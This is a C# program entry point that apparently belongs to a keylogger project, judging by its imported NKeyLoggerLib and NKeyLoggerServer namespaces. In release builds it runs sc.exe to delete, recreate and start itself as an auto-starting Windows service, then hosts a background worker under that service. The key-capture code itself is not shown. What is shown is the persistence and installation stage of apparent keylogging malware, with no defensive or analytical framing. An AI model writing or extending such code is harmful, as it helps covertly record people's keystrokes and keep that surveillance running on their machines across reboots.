using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq.Expressions;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using NKeyLoggerLib;
using NKeyLoggerServer;
class Program
{
    public static async Task Main(string[] args)
    {
#if DEBUG
        ServiceWorker worker = new ServiceWorker();
        CancellationTokenSource cts = new CancellationTokenSource(); 
        await worker.StartAsync(cts.Token);
#else
        string serviceName = System.AppDomain.CurrentDomain.FriendlyName;

        if (args.Length == 0)
        {
            string binPathStr = Directory.GetCurrentDirectory() + $"\\{serviceName}.exe {Directory.GetCurrentDirectory()}";
            Cmd cmd = new Cmd();

            Result<bool>? writeResult = null;
            writeResult = cmd.Write($"sc.exe delete {serviceName}");
            if (writeResult.isFailure)
            {
                Log<Program>.Instance.logger?.LogError(writeResult.Error);
                return;
            }

            writeResult = cmd.Write($"sc.exe create {serviceName} binPath= \"{binPathStr}\" start= auto");
            if (writeResult.isFailure)
            {
                Log<Program>.Instance.logger?.LogError(writeResult.Error);
                return;
            }

            writeResult = cmd.Write($"sc.exe start {serviceName}");
            if (writeResult.isFailure)
            {
                Log<Program>.Instance.logger?.LogError(writeResult.Error);
                return;
            }
            await Task.Delay(2000);
            Console.WriteLine(cmd.Readed);
            await Task.Delay(5000);
            cmd.Dispose();
        }
        else
        {
            if (args.Length != 0)
                Directory.SetCurrentDirectory(args[0]);
            IHost host = Host.CreateDefaultBuilder(args)
            .UseWindowsService(options =>
            {
                options.ServiceName = serviceName;
            })
            .ConfigureServices(services =>
            {
                services.AddHostedService<ServiceWorker>();
            }).Build();
            await host.RunAsync();
        }
#endif
    }
}
